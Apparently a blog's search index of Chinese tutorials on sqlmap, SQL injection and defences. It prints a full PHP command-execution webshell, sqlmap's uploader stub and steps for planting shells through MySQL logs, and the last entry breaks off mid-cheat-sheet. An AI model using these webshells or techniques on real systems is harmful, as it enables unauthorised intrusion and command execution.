<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>sqlmap流量分析</title>
    <link href="/2021/02/01/sqlmap1/"/>
    <url>/2021/02/01/sqlmap1/</url>
    
    <content type="html"><![CDATA[<p>十、使用shell命令:<br>参数–os-shell(分析一下)<br>前提:需要网站的物理路径，其次是需要有FIILE权限。<br>sqlmap -r“C:\sqlmap\request.txt” -p id –dms mysql –os-shell</p><p>接下来指定网站可写日录:<br>“C: \www”<br>d: \phpstudy \www(成功)</p><p>以印度朋友写的靶场开搞</p><p><a href="http://www.sql.com/Less-1/?id=1">http://www.sql.com/Less-1/?id=1</a></p><p>平常我们直接上马可能会被过滤掉后缀禁止上传，那如果我们也想sqlmap一样，先上传一个具有上传功能的文件，然后再继续上传马子就不会有黑名单拦截。</p><p>现在就可以看看sqlmap是怎么操作的了</p><p>在进行之前，先判断是否为管理员，以防写不进去</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> ./sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://www.sql.com/Less-1/?id=1&quot;</span> --<span class="hljs-keyword">is</span>-dba<br></code></pre></td></tr></table></figure><p>具备写文件的条件之一</p><p><img src="C:\boke\95\source_posts\sqlmap1\image-20221023194902258.png" alt="image-20221023194902258"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> ./sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://www.sql.com/Less-1/?id=1&quot;</span> --os-<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><p>第一步先让你选择什么类型的网站1，第二部让你选写入什么类型的马</p><p>假如我们有网站的绝对路径</p><p>注意哈：我们只能在当前文件夹操作，因为我们并没有操作其他文件夹的权限</p><p><img src="C:\boke\95\source_posts\sqlmap1\image-20221023200811003.png" alt="image-20221023200811003"></p><p><img src="C:\boke\95\source_posts\sqlmap1\image-20221023200939871.png" alt="image-20221023200939871"></p><p>进行burpsuite抓包分析</p><p><img src="C:\boke\95\source_posts\sqlmap1\image-20221023202716803.png" alt="image-20221023202716803"></p><p><img src="C:\boke\95\source_posts\sqlmap1\image-20221023202827472.png" alt="image-20221023202827472"></p><p>这是第一个写入服务器的文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;upload&quot;</span>]))&#123;<span class="hljs-comment">//判断是否有文件上传，如果没有输出类似于文件上传功能的html页面</span><br>    <span class="hljs-variable">$dir</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;uploadDir&quot;</span>];<span class="hljs-comment">//这些参数在注入之前我们已经填充过了</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">phpversion</span>()&lt;<span class="hljs-string">&#x27;4.1.0&#x27;</span>)&#123; <span class="hljs-comment">//判断什么版本</span><br>        <span class="hljs-variable">$file</span>=<span class="hljs-variable">$HTTP_POST_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>】[<span class="hljs-string">&quot;name&quot;</span>];<br>           @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$HTTP_POST_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-variable">$dir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>();<br>                               &#125;<span class="hljs-keyword">else</span>&#123;<br>                                   <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>                                   @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-variable">$dir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>();<br>                                   &#125;<br>     @<span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file</span>,<span class="hljs-number">0755</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File uploaded&quot;</span>; <span class="hljs-comment">//修改文件夹权限</span><br>   &#125;<span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;form action=&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;PHP_SELF&quot;</span>].<span class="hljs-string">&quot; method=POST enctype=multipart/form-data&gt;</span><br><span class="hljs-string">           &lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;</span><br><span class="hljs-string">           &lt;b&gt;sqlmap file uploader&lt;/b&gt;</span><br><span class="hljs-string">           &lt;br&gt;</span><br><span class="hljs-string">           &lt;input name=file type=file&gt;</span><br><span class="hljs-string">           &lt;br&gt;</span><br><span class="hljs-string">           to directory: &lt;input type=text name=uploadDir value=\\&#x27;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-1&#x27;\\&gt; </span><br><span class="hljs-string">           &lt;input type=submit name=upload value=upload&gt;</span><br><span class="hljs-string">           &lt;/form&gt;&quot;</span>;<br>                               &#125;<br>                               <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第二个数据包才是正真上传马子的数据</p><p><img src="C:\boke\95\source_posts\sqlmap1\image-20221023214458906.png" alt="image-20221023214458906"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]; <span class="hljs-comment">//通过前期上传的文件上传php上传马子</span><br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;max_execution_time&quot;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$z</span>=@<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&quot;disable_functions&quot;</span>); <span class="hljs-comment">//php.ini配置文件中被禁用掉的命令执行函数</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$z</span>))&#123;<br>    <span class="hljs-variable">$z</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[, ]+/&quot;</span>,<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$z</span>);<br>    <span class="hljs-variable">$z</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$z</span>);<br>    <span class="hljs-variable">$z</span>=<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&quot;trim&quot;</span>,<span class="hljs-variable">$z</span>); <span class="hljs-comment">//如果有被禁用的函数，则转进一个数组里面</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$z</span>=<span class="hljs-keyword">array</span>();&#125;<span class="hljs-variable">$c</span>=<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; 2&gt;&amp;1\n&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"><span class="hljs-variable">$n</span></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$z</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$n</span>)<span class="hljs-keyword">and</span>!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$n</span>,<span class="hljs-variable">$z</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;system&quot;</span>))&#123;<span class="hljs-comment">//调用f()函数，看1是否在禁用名单内，如果不在，用这个命令执行函数来执行用户传入的cmd（命令）</span><br>    <span class="hljs-title function_ invoke__">ob_start</span>();<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">ob_get_clean</span>();<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;proc_open&quot;</span>))&#123;<br>    <span class="hljs-variable">$y</span>=<span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$c</span>,<span class="hljs-keyword">array</span>(<span class="hljs-keyword">array</span>(pipe,r),<span class="hljs-keyword">array</span>(pipe,w),<span class="hljs-keyword">array</span>(pipe,w)),<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$t</span>[<span class="hljs-number">1</span>]))&#123;<br>        <span class="hljs-variable">$w</span>.=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$t</span>[<span class="hljs-number">1</span>],<span class="hljs-number">512</span>);<br>    &#125;@<span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$y</span>);<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;shell_exec&quot;</span>))&#123;<br>    <span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;passthru&quot;</span>))&#123;<br>    <span class="hljs-title function_ invoke__">ob_start</span>();<br>    <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">ob_get_clean</span>();<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;popen&quot;</span>))&#123;<br>    <span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$c</span>,r);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$x</span>))&#123;<span class="hljs-variable">$w</span>.=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$x</span>,<span class="hljs-number">512</span>);<br>                        &#125;<br>    &#125;@<span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$x</span>);<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;exec&quot;</span>))&#123;<br>    <span class="hljs-variable">$w</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>,<span class="hljs-variable">$w</span>);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">10</span>),<span class="hljs-variable">$w</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">10</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$w</span>=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$w</span>&lt;/pre&gt;&quot;</span>;<span class="hljs-comment">//回显结果</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>sqlmap流量分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlmap流量分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap的使用</title>
    <link href="/2021/01/28/sql4/"/>
    <url>/2021/01/28/sql4/</url>
    
    <content type="html"><![CDATA[<p>SQLmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。</p><p>支持的数据库:MySQL，Oracle,PostgreSQL,Microsoft SQL’Server,Microsoft Access,IBM DB2,SQLite,Firebird, Sybase andSAP MAXDB。</p><p>sQLmap支持五种不同的注入模式:<br>◆UNION query sQL injection(可联合查询注入)</p><p>◆Error-based sQL injection(报错型注入)<br>◆Boolean-based blind sQL injection(布尔型注入)</p><p>◆Time-based blind sQL injection(基于时间延迟注入）</p><p>◆Stacked queries sQL injection (可多语句查询注入)</p><p>二、设置目标URL</p><p>-u&#x2F;–url<br>最基本格式sqlmap -u”<a href="http://www.target.com/index.php?id=1%E2%80%9D">http://www.target.com/index.php?id=1”</a></p><p>-m<br>从文本中获取多个目标扫描,但是每一行只能有一个ur1.sqlmap-ur1list.txt</p><p>-r<br>从文件中加载HTTP请求，这样的话就不需要在去设定cookie, POST数据……等等。</p><p>三、设置回显等级<br>参数: -v默认为1:<br>0、只显示python错误以及严重的信息。<br>1、同时显示基本信息和警告信息。（默认等级&gt;</p><p>2、同时显示debug信息。<br>3、同时显示注入的payload。</p><p>4、同时显示HTTP请求。</p><p>5、同时显示HTTP响应头。</p><p>6、同时显示HTTP响应页面。</p><p>四、设置HTTP数据包相关参数<br>参数: –data<br>此参数是把data后面的数据以POST方式提交，sqlmap会像检测GET参数一样检测POST提交过去的参数。<br>python sqlmap.py -u “<a href="http://www.target.com/vuln.php&quot;">http://www.target.com/vuln.php&quot;</a> –data&#x3D;”id&#x3D;1”<br>参数: –cookie<br>当web需要登录的时候，需要我们抓包获取cookie参数，然后复制出来，加到–cookie参数中。<br>–cookie&#x3D;” Cookie: Hm_lvt6910067,1546929561,1547001094,1547024662;PHPSESSID&#x3D;o64fbvo316lg59njufl2gfutm4; “</p><p>四、设置HTTP数据包相关参数<br>HTTP User-Agent头参数:–user-agent<br>默认情况下sqlmap的HTTP请求头中的User-Agent值是: sqlmap&#x2F;1.O-dev-xxxxxxxxx(<a href="http://sqlmap.org/">http://sqlmap.org</a>)<br>这个时候可以手动指定伪造一个User-Agent。<br>sqlmap -u “<a href="http://www.target.com”--level/">http://www.target.com”--level</a> 3 –user-agent&#x3D;” aaaaaa” –dbs<br>参数: –random-agent会从&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;txt&#x2F;user-agents.txt中随机产生User-Agent头。<br>sqlmap -u “<a href="http://www.target.com”/">http://www.target.com”</a> –level 3 –random-agent –dbs<br>sqlmap检查uesr-agent中的注入点, level&gt;&#x3D;3才会去检查user-agent头是否存在注入漏洞</p><p>四、设置HTTP数据包相关参数<br>HTTP Referer头<br>参数: –referer<br>sqlmap可以在请求中伪造HTTP中的referer。sqlmap -u “<a href="http://www.target.com/?id=1%E2%80%9Dreferer=&quot;">http://www.target.com/?id=1”referer=&quot;</a> <a href="http://www.baidu.com&quot;/">http://www.baidu.com&quot;</a><br>当–level参数设定&gt;&#x3D;3时，会尝试进行referer注入。</p><p>四、设置HTTP数据包相关参数<br>–delay<br>可以设定两个http请求间的延迟，设定为1的时候是1秒，默认是没有延迟的。<br>–timeout<br>可以设定一个http请求超过多少秒判定为超时，默认是30秒。</p><p>五、指定测试参数<br>-p ,<br>sqlmap默认会测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User- Agent和HTTP Referer头的值。<br>例如: -p“id,user-angent”<br>–skip<br>在使用–level时，级别很大的时候，但是有些参数不能去测试，那么可以使用–skip参数跳过。<br>例如: –skip&#x3D;” user-agent,referer”</p><p>六、设定探测等级<br>–level (sqlmap -r情况下)<br>共有五个等级，默认为1，sqlmap使用的payload可以在<br>xml&#x2F;payloads.xml中看到，自己也可以根据相应的格式添加自己的payload。<br>level&gt;&#x3D;2的时候就会测试HTTP Cookie。<br>level&gt;&#x3D;3的时候就会测试HTTP User-Agent&#x2F;Referer头。level&#x3D;5的时候会测试HTTP Host。</p><p>七、设定探测风险等级<br>–risk<br>共有三个风险等级，1-3，<br>默认是1会测试大部分的测试语句，2会增加基于时间的测试语句，3会增加OR语句的SQL注入测试。<br>在有些时候，例如在UPDATE，DELETE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p><p>八、列数据</p><p>–dbs<br>列出所有的数据库<br>列出当前登录的用户名<br>–users,<br>–passwords,<br>列出当前登录的用户密码<br>–is-dba<br>判断是否root权限<br>–technique :指定使用哪种注入类型<br>B:基于Boolean的盲注（Boolean based blind&gt;Q:内联查询(inlin queries)<br>T:基于时间的盲注（time based blind&gt;U:联合查询(union query based)E:错误（error based）<br>S:栈查询(stack queries)<br>速度排序&#x3D;联合&gt;报错&gt;布尔&gt;延迟</p><p>八、列数据<br>–current-db当前数据库–privileges权限<br>-Ddatabase_name –tables<br>-Ddatabase_name -T table_name –columns<br>-D database_name -T table_name -C column_1,column_2 –dump</p><p>九、一些常用的参数<br>–users列数据库管理用户,当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。<br>–current-user在大多数据库中可以获取到管理数据的用户。–is-dba 判断当前的用户是否为管理，是的话会返回True。<br>–privileges当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看那个用户的权限。</p><p>九、一些常用的参数<br>–proxy指定一个代理服务器eg:-proxy <a href="http://local:8080select">http://local:8080select</a> * from users where id&#x3D;l(1’)))<br>–prefix&#x3D;PREFIX注入payload字符串前缀-suffix&#x3D;SUFFIX注入payload字符串后缀<br>eg: sqlmap -u “<a href="http://www.target.com/index.php?id=1%E2%80%9D">www.target.com/index.php?id=1”</a> -p id –prefix “”))))”–suffix“AND (‘1’&#x3D;’1”</p><p>九、一些常用的参数<br>移动文件:<br>sqlmap -u “<a href="http://www.a.com/1.php?id=1%E2%80%9D--file-write=&quot;">www.a.com/1.php?id=1”--file-write=&quot;</a> d:&#x2F;2.txt”–file-dest&#x3D;”E:&#x2F;wwwroot&#x2F;bihuoedu&#x2F;one.php “<br>–batch 全自动<br>–start&#x3D;开始条数–stop&#x3D;结束条数–dump 导出当前数据库所有数据–dump-all 导出数据库所有数据–purge清空缓存目录<br>–sql-shell反弹sqlshell,类似于sql查询分析器默认路径.sqlmap(点sqlmap)</p><p>十、使用shell命令:<br>参数–os-shell(分析一下）<br>前提:需要网站的物理路径，其次是需要有FIILE权限。<br>sqlmap -r“C: \sqlmap\request.txt” -p id –dms mysql –os-shell接下来指定网站可写目录:<br>“C: \www”<br>d : \phpstudy \www(成功)</p><p>十一.sqlmap常用脚本</p><p>序号 脚本名称注释<br>1Ox2char将每个编码后的字符转换为等价表达<br>2apostrophemask单引号替换为Utf8字符<br>3apostrophenullencode替换双引号为%00%27<br>4appendnullbyte有效代码后添加%00<br>5base64encode使用base64编码<br>6between比较符替换为between<br>7bluecoat空格替换为随机空白字符，等号替换为like<br>8chardoubleencode双url编码<br>9charencode将url编码<br>10charunicodeencode 使用unicode编码<br>11charunicodeescape以指定的payload反向编码未编码的字符<br>12commalesslimit改变limit语句的写法<br>13commalessmid改变mid语句的写法<br>14commentbeforeparentheses在括号前加内联注释<br>15concat2concatws替换CONCAT为CONCAT_wS</p>]]></content>
    
    
    
    <tags>
      
      <tag>sqlmap的使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql写马</title>
    <link href="/2021/01/27/sql3/"/>
    <url>/2021/01/27/sql3/</url>
    
    <content type="html"><![CDATA[<p>今天实战的时候遇到写木马被限制了,一时想不起来还有啥方法,于是特出此篇记录….顺便复习一下防御手段</p><h6 id="一-数据库慢日志写木马"><a href="#一-数据库慢日志写木马" class="headerlink" title="一.数据库慢日志写木马"></a>一.数据库慢日志写木马</h6><p>security_file_priv会阻拦我们使用outfile写入文件,没有服务器权限无法修改my.ini配置文件,可以利用慢查询日志写入shell</p><p>有时候全局日志会写死</p><p>使用慢查询日志,只有超时(系统时间)才会被写入日志</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%slow_query_log%&#x27;</span>;  <br><br>-- show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%general_log%&#x27;</span>;  <br>-- show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%slow_query_log%&#x27;</span>;  <br>-- <span class="hljs-keyword">set</span> global <span class="hljs-comment">slow_query_log =</span><span class="hljs-comment">&#x27;C:/phpstudy_pro/WWW/hh.php&#x27;</span><br>-- <span class="hljs-keyword">set</span> <span class="hljs-comment">global slow_query_log_file =</span> <span class="hljs-comment">&#x27;C:/phpstudy_pro/WWW/hh.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>版本不一样,语句写法不一样</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">-- show global variables like &#x27;%long_query_time%&#x27;;适用于小皮面板的环境</span><br><span class="language-xml">-- select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; or sleep(11); </span><br></code></pre></td></tr></table></figure><h6 id="二-数据库全局日志写木马"><a href="#二-数据库全局日志写木马" class="headerlink" title="二.数据库全局日志写木马"></a>二.数据库全局日志写木马</h6><p>查看是否开启全局日志</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%general%&#x27;</span>; <br></code></pre></td></tr></table></figure><p>开启全局日志 </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-keyword">on</span>; <br></code></pre></td></tr></table></figure><p> 将全局日志路径设置为shell文件路径 </p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file = <span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;</span>;  <br></code></pre></td></tr></table></figure><p>执行语句,日志记录语句,并会执行</p><h6 id="三-sql注入防御"><a href="#三-sql注入防御" class="headerlink" title="三.sql注入防御"></a>三.sql注入防御</h6><p>防御sql注入的核心思想就是对用户输入的数据进行严格的检查,并且对数据库的使用最小权限分配规则.目前sql注入的防御手段有以下几种:</p><p>1.预编译(PDO)</p><p>一般遇到这种,如果后端代码编写没有逻辑上的错误,一般都注入不成功,但是有个特例,如果具有order by 语句的话不能使用预编译(因为”order by后不能参数化的本质是：一方面预编译又只有自动加引号的setString()方法，没有不加引号的方法；而另一方面order by后接的字段名不能有引号。”)</p><p>2.基于攻击特征的匹配过滤.</p><p>这是目前使用最广泛大的方式,系统会将攻击特征做成数据库,一旦匹配到这些攻击特征就会认定检测得到sql注入.这种方式可以有效的过滤大部分sql注入攻击,但是大大增加了程序的复杂度,同时也有可能影响到业务的正常查询.</p><p>3.对用户输入进行转义.</p><p>例如,常见的SQL注入语句中都有单引号双引号之类的,通过转义,SQL注入就不会达到攻击者所预期的执行效果,从而是实现对sql注入进行防御</p><p>4.数据类型进行严格定义.数据长度进行严格规定.</p><p>比如查询数据库某条记录的id,定义它为整形如果用户输入的数据不符合条件,要对数据进行过滤,数据长度也应该做严格的限制,可以防止较长的SQL注入语句.</p><p>5.严格限制网站访问数据库的权限</p><p>6.其他防御措施.例如避免网站显示sql执行错误信息,防止攻击者使用基于错误的方式进行注入;每个数据层编码同意,防止过滤模型被绕过等</p><p>7.相关函数</p><p>inteval(数字化) addslashes(转义),mysql_real_eacape_string()(这个好想已经被弃用)</p><p>这几天实战发现有些后端编写有点那啥,一输入单引号或者双引号,直接die掉程序(部分搜索之类功能),有的更是离谱,有一个括号加空格闭合的.这比n个单双引号闭合还离谱.</p>]]></content>
    
    
    <categories>
      
      <category>sql写马</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql写马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入备忘录</title>
    <link href="/2021/01/25/sql2/"/>
    <url>/2021/01/25/sql2/</url>
    
    <content type="html"><![CDATA[<h2 id="SQL注入备忘表"><a href="#SQL注入备忘表" class="headerlink" title="SQL注入备忘表"></a>SQL注入备忘表</h2><h4 id="一-联合注入"><a href="#一-联合注入" class="headerlink" title="一 . 联合注入"></a>一 . 联合注入</h4><p>列出所有数据库 : </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">limit</span> 一个一个打印出来库名<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">SCHEMA_NAME</span> <span class="hljs-keyword">from</span> information_schema.SCHEMATA <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br>group_concat 一次性全部显示<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">SCHEMA_NAME</span>) <span class="hljs-keyword">from</span> information_schema.SCHEMATA<br><br></code></pre></td></tr></table></figure><p>列出(数据库：test)中所有的表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">limit</span> 一个一个打印出来字段名<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">TABLE_NAME</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br>group_concat 一次性全部显示<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">TABLE_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-number">0x674657374</span><br>注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。<br></code></pre></td></tr></table></figure><p>列出（数据库：test 表：admin ）中所有的字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">imit 一个一个打印出来<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">COLUMN_NAME</span> <span 